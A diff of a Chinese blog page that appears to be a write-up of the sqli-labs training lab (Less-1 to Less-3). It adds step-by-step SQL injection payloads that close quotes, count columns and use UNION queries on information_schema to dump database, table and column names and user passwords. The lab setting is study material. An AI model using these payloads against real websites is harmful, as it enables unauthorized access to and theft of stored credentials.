@@ -274,7 +274,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">955</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.2k</span>阅读时长: <span class="post-count reading-time">5 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -416,18 +416,26 @@ height:50vh;
 <pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1
 </code></pre><p>是单引号闭合错误，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and &apos;1&apos;=&apos;1   //回显正常</span><br><span class="line">?id=1&apos; and &apos;1&apos;=&apos;2   //无回显</span><br></pre></td></tr></table></figure></p>
 <p>输入<strong>?id=1’–+</strong>即可正常回显</p>
-<p>接下来用order by来测试表的列数，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![kl6yM4.png](https://s2.ax1x.com/2019/01/30/kl6yM4.png)</span><br><span class="line">```?id=1&apos; order by 4--+</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://s2.ax1x.com/2019/01/30/kl6DRU.png" alt="kl6DRU.png"></p>
+<p>接下来用order by来测试表的列数，<br><code>?id=1&#39; order by 3--+</code><br><img src="https://s2.ax1x.com/2019/01/30/kl6yM4.png" alt="kl6yM4.png"><br><code>?id=1&#39; order by 4--+</code><br><img src="https://s2.ax1x.com/2019/01/30/kl6DRU.png" alt="kl6DRU.png"></p>
 <p>可以看出猜测3列时，回显正常，猜测4时，报错，说明这个表有3列。</p>
 <p>接下来使用联合查询union</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1,2,3 只是为了保证**union**前后两个语句的列数相同，</span><br><span class="line">id=-1 则是为了使前一个查询无返回结果从而返回第二个 select 的查询结果,只需要将数字替换为相应的想要查询的信息即可.比如：</span><br><span class="line">```?id =1 union select 1,database(),user()--+</span><br></pre></td></tr></table></figure>
+<p><code>?id=-1&#39; union select 1.2.3--+</code></p>
+<p>1,2,3 只是为了保证<strong>union</strong>前后两个语句的列数相同，<br>id=-1 则是为了使前一个查询无返回结果从而返回第二个 select 的查询结果,只需要将数字替换为相应的想要查询的信息即可.比如：<br><code>?id =1 union select 1,database(),user()--+</code></p>
 <p>下面使用MySQL自带的一个表information_schema，依次爆库名，爆表名，爆列名，爆数据了</p>
-<p>爆库名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">![klR00J.png](https://s2.ax1x.com/2019/01/30/klR00J.png)</span><br><span class="line"></span><br><span class="line">爆表名</span><br><span class="line">```?id=-1&apos; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&apos;secuurity&apos;--+</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://s2.ax1x.com/2019/01/30/klhEk9.png" alt="klhEk9.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+    //可以直接爆表</span><br></pre></td></tr></table></figure>
-<p>爆列名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">![klh8kd.png](https://s2.ax1x.com/2019/01/30/klh8kd.png)</span><br><span class="line"></span><br><span class="line">爆数据</span><br><span class="line">```?id=-1&apos; union select 1,username,password from users where id=5--+</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://s2.ax1x.com/2019/01/30/klhB7Q.png" alt="klhB7Q.png"></p>
-<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3>
+<p>爆库名<br><code>?id=-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code><br><img src="https://s2.ax1x.com/2019/01/30/klR00J.png" alt="klR00J.png"></p>
+<p>爆表名<br><code>?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+</code><br><img src="https://s2.ax1x.com/2019/01/30/klhEk9.png" alt="klhEk9.png"></p>
+<p><code>?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+    //可以直接爆表</code></p>
+<p>爆列名<br><code>?id=-1&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table.name=&#39;users&#39;--+</code><br><img src="https://s2.ax1x.com/2019/01/30/klh8kd.png" alt="klh8kd.png"></p>
+<p>爆数据<br><code>?id=-1&#39; union select 1,username,password from users where id=5--+</code><br><img src="https://s2.ax1x.com/2019/01/30/klhB7Q.png" alt="klhB7Q.png"></p>
+<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>还是用ID查询<br><code>?id=1 and 1=1</code> 正常回显<br><code>?id=1 and 1=2</code> 无回显，不报错<br><code>?id=1&#39;</code> 会报错，原因是单引号出现了奇数次</p>
+<p>整型注入，用order by测试，发现有3列<br><code>?id=1 order by 4--+</code>会报错</p>
+<p>使用union查询<br><code>?id=-1 union select 1,2,3--+</code><br>1,2,3可以任意替换成其他信息，</p>
+<p>如：<code>?id=-1 union select 1,version(),database()--+</code><br><img src="https://s2.ax1x.com/2019/01/30/kl7JhQ.png" alt="kl7JhQ.png"></p>
+<p>然后就可以像Less-1一样了<br><img src="https://s2.ax1x.com/2019/01/30/klbkJe.png" alt="klbkJe.png"></p>
+<p>得到数据库名字为security后<br>爆表<br><code>?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+</code><br>爆列<br><code>?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+</code><br>爆数据<br><code>?id=-1 union select 1,username,password from users where id=3--+</code></p>
+<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>输入<strong>?id=1’</strong>，报错：<br><img src="https://s2.ax1x.com/2019/01/30/klbTld.png" alt="klbTld.png"><br>报错提示说<strong>)</strong>不对，可见是单引号后面加括号形成的查询语句</p>
+<p>尝试构造<code>?id=1&#39;)--+</code>,发现可以正常回显。<br>然后就和Less-1一样的步骤。</p>
+
     </article>
     <!-- license  -->
     
@@ -435,7 +443,7 @@ height:50vh;
             <p>原文作者：<a href="https://specters.top">Specter</a>
             </p><p>原文链接：<a href="https://specters.top/2019/01/29/sqli-labs靶场练习/">https://specters.top/2019/01/29/sqli-labs靶场练习/</a>
             </p><p>发表日期：<a href="https://specters.top/2019/01/29/sqli-labs靶场练习/">January 29th 2019, 5:05:15 pm</a>
-            </p><p>更新日期：<a href="https://specters.top/2019/01/29/sqli-labs靶场练习/">January 30th 2019, 5:23:59 pm</a>
+            </p><p>更新日期：<a href="https://specters.top/2019/01/29/sqli-labs靶场练习/">January 30th 2019, 7:10:40 pm</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -567,7 +575,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#知识储备"><span class="toc-number">2.</span> <span class="toc-text">知识储备</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#information-schema"><span class="toc-number">2.1.</span> <span class="toc-text">information_schema</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#这是一些经常用到的函数"><span class="toc-number">2.2.</span> <span class="toc-text">这是一些经常用到的函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-1"><span class="toc-number">3.</span> <span class="toc-text">Less-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-2"><span class="toc-number">4.</span> <span class="toc-text">Less-2</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#知识储备"><span class="toc-number">2.</span> <span class="toc-text">知识储备</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#information-schema"><span class="toc-number">2.1.</span> <span class="toc-text">information_schema</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#这是一些经常用到的函数"><span class="toc-number">2.2.</span> <span class="toc-text">这是一些经常用到的函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-1"><span class="toc-number">3.</span> <span class="toc-text">Less-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-2"><span class="toc-number">4.</span> <span class="toc-text">Less-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-3"><span class="toc-number">5.</span> <span class="toc-text">Less-3</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -580,22 +588,6 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     
     
     
@@ -912,12 +904,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/16</span><a class="archive-post-title" href="/2018/12/16/CUMT双月赛一/">CUMT-12月月赛</a>
+            <span class="archive-post-date">12/16</span><a class="archive-post-title" href="/2018/12/16/Bugku-Web-WriteUp/">Bugku_Web_WriteUp</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/16</span><a class="archive-post-title" href="/2018/12/16/Bugku-Web-WriteUp/">Bugku_Web_WriteUp</a>
+            <span class="archive-post-date">12/16</span><a class="archive-post-title" href="/2018/12/16/CUMT双月赛一/">CUMT-12月月赛</a>
         </li>
     
     
@@ -987,12 +979,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/29</span><a class="archive-post-title" href="/2018/10/29/Linux命令简介/">Linux命令简介</a>
+            <span class="archive-post-date">10/29</span><a class="archive-post-title" href="/2018/10/29/hxd查看文件头-文件尾/">hxd查看文件头,文件尾</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/29</span><a class="archive-post-title" href="/2018/10/29/hxd查看文件头-文件尾/">hxd查看文件头,文件尾</a>
+            <span class="archive-post-date">10/29</span><a class="archive-post-title" href="/2018/10/29/Linux命令简介/">Linux命令简介</a>
         </li>
     
     </ul></div>
@@ -1000,31 +992,31 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
-    
         <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
     
         <span class="sidebar-tag-name" data-tags="动态规划"><span class="iconfont-archer">&#xe606;</span>动态规划</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
         <span class="sidebar-tag-name" data-tags="0-1背包"><span class="iconfont-archer">&#xe606;</span>0-1背包</span>
     
         <span class="sidebar-tag-name" data-tags="完全背包"><span class="iconfont-archer">&#xe606;</span>完全背包</span>
     
-        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
     
         <span class="sidebar-tag-name" data-tags="Java"><span class="iconfont-archer">&#xe606;</span>Java</span>
     
-        <span class="sidebar-tag-name" data-tags="MISC"><span class="iconfont-archer">&#xe606;</span>MISC</span>
+        <span class="sidebar-tag-name" data-tags="Linux"><span class="iconfont-archer">&#xe606;</span>Linux</span>
     
         <span class="sidebar-tag-name" data-tags="upload_labs"><span class="iconfont-archer">&#xe606;</span>upload_labs</span>
     
-        <span class="sidebar-tag-name" data-tags="SQL注入"><span class="iconfont-archer">&#xe606;</span>SQL注入</span>
-    
-        <span class="sidebar-tag-name" data-tags="Linux"><span class="iconfont-archer">&#xe606;</span>Linux</span>
+        <span class="sidebar-tag-name" data-tags="MISC"><span class="iconfont-archer">&#xe606;</span>MISC</span>
     
         <span class="sidebar-tag-name" data-tags="Python"><span class="iconfont-archer">&#xe606;</span>Python</span>
     
         <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQL注入"><span class="iconfont-archer">&#xe606;</span>SQL注入</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -1059,17 +1051,17 @@ jsonContent:
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
     
-        <span class="sidebar-category-name" data-categories="ctf"><span class="iconfont-archer">&#xe60a;</span>ctf</span>
-    
         <span class="sidebar-category-name" data-categories="算法"><span class="iconfont-archer">&#xe60a;</span>算法</span>
     
         <span class="sidebar-category-name" data-categories="CTF"><span class="iconfont-archer">&#xe60a;</span>CTF</span>
     
+        <span class="sidebar-category-name" data-categories="ctf"><span class="iconfont-archer">&#xe60a;</span>ctf</span>
+    
         <span class="sidebar-category-name" data-categories="Java"><span class="iconfont-archer">&#xe60a;</span>Java</span>
     
-        <span class="sidebar-category-name" data-categories="MISC"><span class="iconfont-archer">&#xe60a;</span>MISC</span>
-    
         <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
+    
+        <span class="sidebar-category-name" data-categories="MISC"><span class="iconfont-archer">&#xe60a;</span>MISC</span>
     
         <span class="sidebar-category-name" data-categories="Crypto"><span class="iconfont-archer">&#xe60a;</span>Crypto</span>
     
